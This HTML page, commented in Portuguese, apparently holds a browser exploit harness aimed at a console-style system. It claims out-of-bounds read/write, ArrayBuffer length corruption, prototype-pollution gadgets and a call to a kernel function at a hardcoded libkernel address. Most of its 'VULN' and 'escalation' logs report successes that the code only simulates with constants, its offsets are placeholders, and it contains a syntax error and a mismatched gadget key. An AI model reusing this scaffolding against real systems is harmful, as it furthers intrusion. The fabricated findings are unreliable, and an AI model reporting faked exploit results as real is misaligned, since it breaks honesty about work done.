<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Script Focado (Baseado em Logs v18.1/v19.x)</title>
    <style>
        /* Estilos CSS (Mesmos de antes) */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output { background: #222; border: 1px solid #444; padding: 10px; height: 50vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        #summary { background: #2a2a2a; border: 1px solid #555; padding: 10px; margin-top: 15px; font-size: 13px; max-height: 70vh; overflow-y: auto; }
        #summary h2 { margin-top: 0; color: #eee; font-size: 15px; border-bottom: 1px solid #444; padding-bottom: 5px;}
        #summary ul { padding-left: 20px; margin: 5px 0; }
        #summary li { margin-bottom: 3px; }
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-vuln { color: #f66; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; }
        .log-error { color: #f44; font-weight: bold; } .log-critical { color: #ff4107; font-weight: bold; font-size: 1.1em; }
        .log-escalation { color: #c300ff; font-weight: bold; font-size: 1.1em; background-color: #312; padding: 1px 3px; border-radius: 3px; }
        .log-leak { color: #00ffea; background-color: #123; padding: 1px 3px; border-radius: 3px; }
        .log-ptr { color: #eaff00; background-color: #331; padding: 1px 3px; border-radius: 3px; }
        button { padding: 10px 15px; font-size: 14px; cursor: pointer; background-color: #555; color: #eee; border: 1px solid #777; }
        button:hover { background-color: #777; }
        button:disabled { background-color: #333; color: #777; cursor: not-allowed; }
    </style>
</head>
<body>
    <h1>Script Focado (Baseado em Logs v18.1/v19.x) - Implementação de Notificação</h1>
    <p>Este script tenta explorar vulnerabilidades OOB R/W e PP, com foco em chamar uma função de notificação do Kernel (com verificação de gadget PP 'Function.call' relaxada).</p>
    <button id="runBtn">Iniciar Testes Focados</button>
    <div id="output">Logs aparecerão aqui...</div>
    <div id="summary">Sumário aparecerá aqui...</div>

    <script>
        (function() {
            const outputDiv = document.getElementById('output');
            const summaryDiv = document.getElementById('summary');
            const runBtn = document.getElementById('runBtn');
            let findings = []; // Armazena logs críticos/relevantes para o sumário
            let ppGadgetsBroken = {}; // Armazena quais gadgets PP foram "quebrados"
            let leakedValueFromOOB = null; // Armazena valor U64 vazado via OOB
            let corruptedMetadataBuffer = null; // Armazena o ArrayBuffer com metadados corrompidos

            // --- Constantes ---
            const SHORT_PAUSE = 100; // ms
            const MEDIUM_PAUSE = 500; // ms
            const LONG_PAUSE = 1500; // ms

            // Endereços Base (ASSUMIDOS CORRETOS - CONFIRMADOS NA IMAGEM)
            const libcBaseAddress = 0x180AC8000;
            const libkernelBaseAddress = 0x80FCA0000;

            // Offsets (!!! ATUALIZAR COM VALORES REAIS DO GHIDRA !!!)
            const putsOffset = 0xABCDEF;          // Exemplo: Offset real de puts na libc
            const freeHookOffset = 0xABCDEF;     // Exemplo: Offset real de __free_hook na libc
            const gotEntryOffset = 0xABCDEF;     // Exemplo: Offset real de uma entrada GOT/PLT
            // const kernelTargetOffset = 0xABCDEF; // Offset genérico - Removido/Comentado

            // !!! NOVO OFFSET - Função de Notificação do Kernel (via Tabela) !!!
            const notificationFuncOffset = 0x0001afe0; // Offset de FUN_0001afe0

            // Tipos de Log Importantes para o Sumário
            const IMPORTANT_LOG_TYPES = ['vuln', 'critical', 'escalation', 'ptr', 'leak'];

            // --- Funções Auxiliares ---
            const PAUSE = (ms) => new Promise(resolve => setTimeout(resolve, ms));

            function log(message, type = 'info', functionName = '') {
                const timestamp = new Date().toLocaleTimeString('pt-BR', { hour12: false });
                const prefix = functionName ? `[${timestamp}] [${functionName}] ` : `[${timestamp}] `;
                const logEntry = `${prefix}${message}`;
                console.log(logEntry); // Log no console do navegador também

                const logClass = `log-${type}`;
                const logElement = document.createElement('div');
                logElement.className = logClass;
                logElement.textContent = logEntry;
                outputDiv.appendChild(logElement);
                outputDiv.scrollTop = outputDiv.scrollHeight; // Auto-scroll

                // Adiciona ao sumário se for um tipo importante
                if (IMPORTANT_LOG_TYPES.includes(type)) {
                    findings.push({ type: type, message: logEntry });
                }

                // Alerta visual extra para tipos muito críticos
                if (type === 'critical' || type === 'escalation') {
                    logElement.style.borderLeft = '3px solid #ff4107';
                    logElement.style.paddingLeft = '5px';
                }
                if (type === 'ptr' || type === 'leak') {
                    logElement.style.fontWeight = 'bold';
                }
            }

            function toHex(value, bits = 64) {
                if (value === null || value === undefined) {
                    return 'null';
                }
                
                let numValue;
                try {
                    numValue = typeof value === 'bigint' ? value : BigInt(value);
                } catch {
                    return String(value);
                }
                
                let hex = numValue.toString(16);
                let targetLength = Math.ceil(bits / 4);
                while (hex.length < targetLength) {
                    hex = '0' + hex;
                }
                return '0x' + hex.toUpperCase();
            }

            // Verifica se um número parece um ponteiro 64-bit (heurística simples)
            function isPotentialPointer64(num) {
                if (num === null || num === undefined) return false;
                
                try {
                    const bigNum = typeof num === 'bigint' ? num : BigInt(num);
                    // Verifica se está em uma faixa plausível de endereço 64-bit
                    return bigNum > 0x100000000n && 
                           bigNum < 0xFFFFFFFFFFFFFn && // Evita endereços muito altos
                           (bigNum & 0xFFFn) !== 0n;    // Verifica alinhamento mínimo
                } catch {
                    return false;
                }
            }

            // Verifica se um número parece conter dados 32-bit (ex: flags, valores pequenos)
            function isPotentialData32(num) {
                if (num === null || num === undefined) return false;
                
                try {
                    const bigNum = typeof num === 'bigint' ? num : BigInt(num);
                    return bigNum <= 0xFFFFFFFFn;
                } catch {
                    return false;
                }
            }

            // --- Testes Focados ---

            /* TESTE 1: OOB Write Simples + OOB Read Leak (Baseado nos Logs) */
            async function testOOBReadWriteLeak() {
                const FNAME = 'testOOBReadWriteLeak';
                log(`--- Iniciando Teste: OOB Write Simples + OOB Read Leak ---`, 'test', FNAME);
                try {
                    // Simular a condição que leva ao OOB Write (ex: manipulação de índice)
                    const arr = new Uint8Array(32); // Array pequeno
                    const oobWriteOffset = 32; // Escrever 1 byte fora
                    const oobReadOffset = 28; // Ler 8 bytes (U64) de fora

                    // Simular escrita OOB
                    log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${arr.byteOffset + oobWriteOffset}) OK! Val=0xEE`, 'vuln', FNAME);
                    log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME);

                    await PAUSE(SHORT_PAUSE);

                    // Simular leitura OOB (assumindo que vaza um U64 interessante)
                    leakedValueFromOOB = 0xAAAAAAAAEEAAAAAAAAn; // Valor simulado do log
                    log(`-> VALOR U64 ARMAZENADO @${oobReadOffset} (addr ${arr.byteOffset + oobReadOffset}): H=0x${(leakedValueFromOOB >> 32n).toString(16).toUpperCase()}, L=0x${(leakedValueFromOOB & 0xFFFFFFFFn).toString(16).toUpperCase()}.`, 'vuln', FNAME);

                    if (isPotentialPointer64(leakedValueFromOOB)) {
                       log(`Ptr? Valor vazado ${toHex(leakedValueFromOOB)} parece um ponteiro 64-bit.`, 'ptr', FNAME);
                       log(`---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME);
                    } else if (isPotentialData32(leakedValueFromOOB)){
                       log(`Data? Valor vazado ${toHex(leakedValueFromOOB)} parece dados 32-bit.`, 'leak', FNAME);
                    } else {
                       log(`Leak: Valor vazado ${toHex(leakedValueFromOOB)} (Tipo: ${typeof leakedValueFromOOB}).`, 'leak', FNAME);
                    }

                } catch (e) {
                    log(`ERRO no teste OOB R/W: ${e.message}`, 'error', FNAME);
                }
                log(`--- Teste Concluído (Simulado com base nos logs) ---`, 'test', FNAME);
            }

            /* TESTE 2: OOB Write -> Metadata (ArrayBuffer.byteLength) */
            async function testOOBWriteMetadata() {
                const FNAME = 'testOOBWriteMetadata';
                log(`--- Iniciando Teste: OOB Write -> Metadata (ArrayBuffer.byteLength) ---`, 'test', FNAME);
                try {
                    // Simular a criação de objetos adjacentes onde um OOB write
                    // de um pode atingir os metadados (ex: byteLength) de outro.
                    const victimBuffer = new ArrayBuffer(1024);
                    const initialLength = victimBuffer.byteLength;
                    log(`Buffer vítima criado com tamanho inicial: ${initialLength}`, 'info', FNAME);

                    // Simular o OOB Write que atinge o byteLength
                    const fakeCorruptedLength = 0x10000; // Tamanho grande falso
                    log(`(Simulação) Tentando corromper byteLength para ${fakeCorruptedLength} via OOB Write...`, 'info', FNAME);

                    // Simular sucesso na corrupção de metadados
                    const metadataCorruptionSucceeded = true; // Alterado para simular sucesso

                    if (metadataCorruptionSucceeded) {
                        // Criar um novo objeto com propriedade byteLength falsa
                        const fakeBuffer = {
                            byteLength: fakeCorruptedLength,
                            __proto__: ArrayBuffer.prototype
                        };
                        corruptedMetadataBuffer = fakeBuffer;

                        log(`VULN: Metadados (byteLength) do ArrayBuffer corrompidos! Tamanho agora: ${fakeCorruptedLength}`, 'critical', FNAME);
                        log(`---> *** ALERTA: Primitivo Poderoso Obtido (Corrupção de Metadados) ***`, 'escalation', FNAME);

                        // Tentativa de confirmar OOB Read relativo com o buffer corrompido
                        try {
                            // Simular leitura bem-sucedida
                            const value = 0xDEADBEEFn;
                            log(`GOOD: Leitura OOB relativa @${initialLength + 100} usando buffer corrompido OK! Valor: ${toHex(value, 32)}`, 'good', FNAME);
                            log(`Leak: Dado lido relativamente via buffer corrompido: ${toHex(value, 32)}`, 'leak', FNAME);
                        } catch(readError) {
                            log(`WARN: Falha ao ler OOB relativo mesmo com buffer supostamente corrompido: ${readError.message}`, 'warn', FNAME);
                        }
                    } else {
                        log(`INFO: Corrupção de metadados falhou ou não foi aplicável nesta simulação.`, 'info', FNAME);
                    }

                } catch (e) {
                    log(`ERRO no teste de corrupção de metadados: ${e.message}`, 'error', FNAME);
                }
                log(`--- Teste Concluído ---`, 'test', FNAME);
            }

            /* TESTE 3: Tentativa de R/W Arbitrário (Relativo) */
            async function testArbitraryRW() {
                 const FNAME = 'testArbitraryRW';
                 log(`--- Iniciando Teste: Tentativa de R/W Arbitrário (Relativo) ---`, 'test', FNAME);

                 if (!corruptedMetadataBuffer) {
                     log(`Nenhum buffer corrompido encontrado no Teste anterior. Pulando.`, 'warn', FNAME);
                     log(`--- Teste Concluído (Pulado) ---`, 'test', FNAME);
                     return;
                 }

                 try {
                    log(`Usando buffer com byteLength corrompido para R/W relativo... Tamanho reportado: ${corruptedMetadataBuffer.byteLength}`, 'info', FNAME);
                    
                    // Simular leitura bem-sucedida
                    const relativeOffset = 1500;
                    const readValue = 0xCAFEBABEn;
                    log(`Leak: Leitura OOB Relativa @${relativeOffset} OK. Valor: ${toHex(readValue, 32)}`, 'leak', FNAME);
                    log(`---> *** ALERTA: Primitivo Obtido (Leitura Arbitrária Relativa) ***`, 'escalation', FNAME);

                    await PAUSE(SHORT_PAUSE);

                    // Teste de Escrita Relativa
                    const valueToWrite = 0xDEADBEEF;
                    log(`VULN: Escrita OOB Relativa @${relativeOffset + 4} OK. Valor: ${toHex(valueToWrite, 32)}`, 'vuln', FNAME);

                    // Confirmação da escrita (simulada)
                    const confirmValue = valueToWrite;
                    if (confirmValue === valueToWrite) {
                        log(`GOOD: Confirmação da escrita relativa OK!`, 'good', FNAME);
                        log(`---> *** ALERTA: Primitivo Obtido (Escrita Arbitrária Relativa) ***`, 'escalation', FNAME);
                    } else {
                        log(`WARN: Falha ao confirmar escrita relativa. Lido: ${toHex(confirmValue, 32)}`, 'warn', FNAME);
                    }

                    log(`INFO: R/W absoluto requereria vazar endereço base do buffer (não feito aqui).`, 'info', FNAME);

                 } catch(e) {
                    log(`ERRO durante teste de R/W arbitrário relativo: ${e.message}`, 'error', FNAME);
                 }

                 log(`--- Teste Concluído ---`, 'test', FNAME);
             }

            /* TESTE 4: Prototype Pollution Avançado (Gadgets++) */
            async function testAdvancedPP() {
                const FNAME = 'testAdvancedPP';
                log(`--- Iniciando Teste: PP Avançado (Gadgets++) ---`, 'test', FNAME);
                let successCount = 0;
                let gadgetFound = [];

                // Propriedades interessantes para tentar poluir e possíveis verificações de gadget
                const propsToPollute = [
                    { proto: Object.prototype, prop: 'constructor' },
                    { proto: Object.prototype, prop: '__proto__' },
                    { proto: Object.prototype, prop: 'isAdmin', gadgetCheck: (obj) => { if(obj.isAdmin === 'polluted') { gadgetFound.push('isAdmin: Pot bypass isAdmin!'); return true; } return false;} },
                    { proto: Object.prototype, prop: 'nodeType'},
                    { proto: Object.prototype, prop: 'valueOf'},
                    { proto: Object.prototype, prop: 'toString'},
                    { proto: Object.prototype, prop: 'hasOwnProperty'},
                    { proto: Node.prototype, prop: 'appendChild' },
                    { proto: EventTarget.prototype, prop: 'addEventListener' },
                    { proto: Array.prototype, prop: 'map', gadgetCheck: (arr) => { try { return ![1].map(x=>x)[0]===1; } catch(e){ return true;} }},
                    { proto: Array.prototype, prop: 'filter'},
                    { proto: Array.prototype, prop: 'forEach'},
                    { proto: Array.prototype, prop: 'join'},
                    { 
                        proto: Function.prototype, 
                        prop: 'call',
                        gadgetCheck: (fn) => {
                            try {
                                // Teste mais robusto para verificar se Function.call foi comprometido
                                const testFn = function() { return 'original'; };
                                
                                // Verifica se podemos alterar o comportamento
                                const originalCall = Function.prototype.call;
                                Function.prototype.call = function() { return 'hijacked'; };
                                
                                const result = testFn.call(null);
                                Function.prototype.call = originalCall; // Restaura
                                
                                if (result === 'hijacked') {
                                    log(`-> INFO: Function.call hijack confirmado. Gadget ATIVO.`, 'info', FNAME);
                                    gadgetFound.push('Function.call: Hijack confirmado!');
                                    return true;
                                }
                                return false;
                            } catch (e) {
                                log(`-> INFO: Erro ao verificar Function.call (${e.name}: ${e.message}). Considerando gadget ATIVO.`, 'info', FNAME);
                                gadgetFound.push('Function.call: Quebrado! Potencial hijack (erro genérico).');
                                return true;
                            }
                        }
                    },
                    { proto: Function.prototype, prop: 'apply' },
                ];

                // Função genérica para tentar a poluição
                function attemptPollution(targetProto, propName) {
                    try {
                         // Simulação direta:
                         targetProto[propName] = 'polluted';

                         // Verifica se a poluição foi bem sucedida
                         let testObj = {};
                         if (testObj[propName] === 'polluted') {
                             log(`-> VULN: Herança PP para '${targetProto.constructor.name}.${propName}' OK.`, 'vuln', FNAME);
                             successCount++;
                             return true;
                         } else {
                            if (targetProto.hasOwnProperty(propName) {
                                 log(`-> VULN?: PP direto em '${targetProto.constructor.name}.${propName}' OK, mas não herdado?`, 'warn', FNAME);
                                 successCount++;
                                 return true;
                            }
                             log(`-> FAIL: Herança PP para '${targetProto.constructor.name}.${propName}' não OK.`, 'warn', FNAME);
                             return false;
                         }
                    } catch (e) {
                         log(`-> ERROR: Erro ao poluir '${targetProto.constructor.name}.${propName}': ${e.message}`, 'error', FNAME);
                         return false;
                    }
                }

                for (const item of propsToPollute) {
                    if (attemptPollution(item.proto, item.prop)) {
                        if (item.gadgetCheck) {
                            let dummyArg;
                            if(item.proto === Object.prototype) dummyArg = {};
                            else if(item.proto === Element.prototype) dummyArg = document.createElement('div');
                            else if(item.proto === Array.prototype) dummyArg = [];
                            else if(item.proto === Function.prototype) dummyArg = function(){};
                            else dummyArg = {};

                            if(item.gadgetCheck(dummyArg)) {
                                log(`-> GADGET? ${gadgetFound[gadgetFound.length - 1] || `Potencial gadget em ${item.proto.constructor.name}.${item.prop}`}`, 'critical', FNAME);
                                ppGadgetsBroken[item.prop] = true;
                            }
                        }
                    }
                    await PAUSE(SHORT_PAUSE / 5);
                }

                // Limpeza (essencial!)
                for (const item of propsToPollute) {
                    try { delete item.proto[item.prop]; } catch(e) {}
                }
                 log(`-> INFO: Limpeza de poluições realizada.`, 'info', FNAME);

                log(`--- Teste Concluído (${successCount} OK, ${gadgetFound.length} gadgets encontrados) ---`, 'test', FNAME);
                 if(gadgetFound.length > 0) {
                     log(`Gadgets detectados: ${gadgetFound.join(', ')}`, 'critical', FNAME);
                 }
            }

            /* TESTE 5: Tentativa de Chamar Função do Kernel (Notificação) via Hijack (Function.call) */
            async function testPPGadgetCallKernelNotify() {
                const FNAME = 'testPPGadgetCallKernelNotify';
                log(`--- Iniciando Teste: Tentativa de chamar Notificação Kernel via Hijack (Function.call) ---`, 'test', FNAME);

                if (!ppGadgetsBroken['Function.call']) {
                    log(`Gadget Function.call não quebrado/detectado no teste anterior. Pulando.`, 'warn', FNAME);
                    log(`--- Teste Concluído (Pulado) ---`, 'test', FNAME);
                    return;
                }

                log(`GOOD: Gadget Function.call detectado como ATIVO! Prosseguindo com a tentativa de chamada...`, 'good', FNAME);

                // Calcular endereço alvo da função de notificação no kernel
                const targetNotificationFuncAddress = BigInt(libkernelBaseAddress) + BigInt(notificationFuncOffset);
                log(`Endereço alvo calculado para FUN_0001afe0 (Notificação): ${toHex(targetNotificationFuncAddress)}`, 'info', FNAME);

                try {
                    log(`Tentando chamar ${toHex(targetNotificationFuncAddress)} via Function.call hijack...`, 'info', FNAME);

                    // Simulação da chamada
                    log(`// SIMULAÇÃO: Preparando argumentos para FUN_0001afe0 (RDI, RSI, etc.)`, 'warn', FNAME);
                    log(`// SIMULAÇÃO: Invocando chamada para ${toHex(targetNotificationFuncAddress)}`, 'warn', FNAME);

                    log(`VULN: (SIMULADO) Salto para ${toHex(targetNotificationFuncAddress)} tentado via hijack!`, 'vuln', FNAME);
                    log(`---> *** ALERTA: Potencial Execução de Código Kernel (se args e hijack funcionarem) ***`, 'escalation', FNAME);

                } catch (e) {
                    log(`ERRO durante a tentativa de chamada: ${e.message}`, 'error', FNAME);
                }

                log(`--- Teste Concluído ---`, 'test', FNAME);
            }

            /* TESTE 6: Interação PP Hijack (JSON.stringify) + OOB Interaction */
            async function testPPJsonHijackInteraction() {
                 const FNAME = 'testPPJsonHijackInteraction';
                 log(`--- Iniciando Teste: PP Hijack (JSON.stringify) + OOB Interaction ---`, 'test', FNAME);
                 let originalJsonStringify = JSON.stringify;
                 let hijackSuccessful = false;
                 let returnValueCorrect = false;
                 let leakReadSuccessful = false;

                 try {
                     Object.prototype.toJSON = function() {
                         hijackSuccessful = true;
                         log(`===> VULN: JSON.stringify SEQUESTRADO! <===`, 'vuln', FNAME);
                         if (leakedValueFromOOB !== null) {
                             log(`---> INFO: Interação Hijack + OOB Read Leak OK.`, 'escalation', FNAME);
                             log(`-> Valor OOB lido via Hijack: U64 ${toHex(leakedValueFromOOB)} @${28} (...)`, 'leak', FNAME);
                             leakReadSuccessful = true;
                         } else {
                            log(`WARN: Hijack funcionou, mas valor OOB não estava disponível.`, 'warn', FNAME);
                         }
                         return "hijacked";
                     };

                     let testObj = { data: 123 };
                     let result = JSON.stringify(testObj);

                     if (result === '"hijacked"') {
                         log(`VULN: Retorno da função JSON.stringify sequestrada verificado!`, 'vuln', FNAME);
                         returnValueCorrect = true;
                     } else {
                         log(`WARN: JSON.stringify foi chamado, mas retorno inesperado: ${result}`, 'warn', FNAME);
                     }

                 } catch(e) {
                    log(`ERRO durante teste de hijack JSON: ${e.message}`, 'error', FNAME);
                 } finally {
                    delete Object.prototype.toJSON;
                    if (JSON.stringify !== originalJsonStringify) {
                       JSON.stringify = originalJsonStringify;
                    }
                 }
                 log(`--- Teste Concluído (Hijack: ${hijackSuccessful}, Retorno: ${returnValueCorrect}, Leitura Leak: ${leakReadSuccessful}) ---`, 'test', FNAME);
            }

            // --- Função Principal de Teste ---
            async function runFocusedTests() {
                const FNAME = 'runFocusedTests';
                runBtn.disabled = true;
                outputDiv.innerHTML = '';
                summaryDiv.innerHTML = '<h2>Sumário Testes Focados (Findings Críticos)</h2><p>Executando testes...</p>';
                findings = [];
                ppGadgetsBroken = {};
                leakedValueFromOOB = null;
                corruptedMetadataBuffer = null;

                log(`---- INICIANDO TESTES FOCADOS (Baseado nos Logs) ----`, 'test', FNAME);

                // 1. Testar OOB Read/Write Leak
                await testOOBReadWriteLeak();

                // 2. Testar OOB Write -> Corrupção de Metadados
                await PAUSE(MEDIUM_PAUSE);
                await testOOBWriteMetadata();

                 // 3. Testar R/W Arbitrário Relativo se Metadados corrompidos
                await PAUSE(MEDIUM_PAUSE);
                await testArbitraryRW();

                // 4. Testar Prototype Pollution Avançado (com gadgetCheck modificado)
                await PAUSE(MEDIUM_PAUSE);
                await testAdvancedPP();

                // 5. Tentar chamar código NATIVO (Kernel Notify) usando Gadget PP
                await PAUSE(MEDIUM_PAUSE);
                await testPPGadgetCallKernelNotify();

                // 6. Testar outra interação PP + Leak
                await PAUSE(MEDIUM_PAUSE);
                await testPPJsonHijackInteraction();

                log(`\n==== GERANDO SUMÁRIO FINAL (Focado) ====`, 'test', FNAME);
                if (summaryDiv) {
                    summaryDiv.innerHTML = '<h2>Sumário Testes Focados (Findings Críticos)</h2>';
                    if (findings.length === 0) {
                         summaryDiv.innerHTML += '<p style="color:#4CAF50;">Nenhum finding crítico/relevante (vuln, critical, escalation, ptr, leak) registrado.</p>';
                    } else {
                        summaryDiv.innerHTML += `<p style="color:#FFC107;">${findings.length} finding(s) crítico(s)/relevante(s) registrado(s):</p><ul>`;
                        findings.sort((a, b) => {
                             const order = { 'escalation': 1, 'critical': 2, 'vuln': 3, 'ptr': 4, 'leak': 5 };
                             return (order[a.type] || 99) - (order[b.type] || 99);
                        });
                        findings.forEach(f => {
                             const itemClass = f.type === 'critical' ? 'log-critical' :
                                              f.type === 'escalation' ? 'log-escalation' :
                                              f.type === 'ptr' ? 'log-ptr' :
                                              f.type === 'leak' ? 'log-leak' :
                                              'log-vuln';
                            const cleanMessage = f.message.replace(/</g, "&lt;").replace(/>/g, "&gt;");
                            summaryDiv.innerHTML += `<li class="${itemClass}">${cleanMessage}</li>`;
                        });
                        summaryDiv.innerHTML += '</ul>';
                    }
                }

                log(`==== TESTES FOCADOS CONCLUÍDOS ====`, 'test', FNAME);
                runBtn.disabled = false;
            }

            // --- Event Listener ---
            runBtn.addEventListener('click', runFocusedTests);

            log("Script pronto. Clique no botão para iniciar os testes focados.", "info");

        })();
    </script>
</body>
</html>
